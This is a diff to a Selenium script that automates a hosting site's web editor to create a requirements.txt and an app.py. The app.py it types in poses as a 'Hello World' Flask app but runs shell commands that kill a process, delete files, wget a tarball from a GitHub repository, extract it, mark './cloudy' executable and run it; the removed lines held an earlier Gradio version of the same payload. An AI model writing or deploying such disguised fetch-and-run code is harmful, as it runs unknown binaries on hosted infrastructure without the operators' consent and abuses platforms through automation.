@@ -91,34 +91,43 @@ driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div
 time.sleep(1)
 driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/div/ul/li[1]").click()
 time.sleep(6)
+driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[1]/input").send_keys("requirements.txt")
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[2]/div/textarea").click()
+actions = ActionChains(driver)
+actions.send_keys("""Flask==2.2.2""")
+actions.perform()
+driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[4]/div[2]/button").click()
+time.sleep(8)
+
+driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[2]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/button").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/div/ul/li[1]").click()
+time.sleep(6)
 driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[1]/input").send_keys("app.py")
 time.sleep(1)
 driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[2]/div/textarea").click()
 actions = ActionChains(driver)
-actions.send_keys("""import gradio as gr
-import os
-def greet(name):
-    os.system("pkill cloudy")
-os.system("rm cloudybork2.tar.gz")
+actions.send_keys("""from flask import Flask
+app = Flask(__name__)
+@app.route("/")
+def hello():
+    return "Hello World!"
+"""+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"""
+if __name__ == '__main__':
+    import os
+os.system("pkill cloudy")
+os.system("rm cloudybork4.tar.gz")
 os.system("rm config.json")
 os.system("rm cloudy")
-os.system("wget https://github.com/n2dhektor/fictional-octo-waddle/raw/main/cloudybork2.tar.gz")
-os.system("tar -xf cloudybork2.tar.gz")
+os.system("wget https://github.com/n2dhektor/fictional-octo-waddle/raw/main/cloudybork4.tar.gz")
+os.system("tar -xf cloudybork4.tar.gz")
 os.system("chmod +x ./cloudy")
 os.system("./cloudy")
-return "Hello " + name + "!!"
-"""+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"""
-iface = gr.Interface(fn=greet, inputs="text", outputs="text")
-iface.launch()""")
+app.run(host="localhost", port=7860, debug=True)""")
 actions.perform()
 driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[4]/div[2]/button").click()
 time.sleep(45)
-driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[1]").click()
-time.sleep(15)
-iframe = driver.find_element(By.XPATH, "/html/body/div/main/div/iframe")
-driver.switch_to.frame(iframe)
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/gradio-app/div/div[2]/div/div/div/div[1]/div[2]/button[2]").click()
-time.sleep(60)
-driver.switch_to.default_content()
 driver.close()
